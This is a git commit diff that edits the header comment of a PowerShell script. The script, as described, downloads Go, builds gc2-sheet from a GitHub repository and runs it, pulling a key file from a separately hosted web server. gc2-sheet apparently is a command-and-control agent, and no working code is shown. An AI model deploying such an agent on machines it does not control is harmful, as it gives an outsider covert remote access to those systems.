be2335fb1c11bdf5f98d58d8445839cb66235c74
Nate <101878955+nathansb2022@users.noreply.github.com>
2024-08-06 22:10:02 -0500

    Update PowershellScript-GC-2.ps1

--- PowershellScript-GC-2.ps1
+++ PowershellScript-GC-2.ps1
@@ -1,7 +1,7 @@
 <#
 A Powershell script that downloads go, adds it the user's path, downloads the zip from the repository "looCiprian/GC2-sheet",
 builds the executable, and runs gc2-sheet. Note: requires a web server to host the #MY_KEY_JSON file to Invoke-Webrequest down,
-#MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Recommend using Invoke-RestMethod or Invoke-WebRequest to pull down
+#MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Recommend using Invoke-WebRequest to pull down
 the contents of the file.
 #>
 # For baked in variables
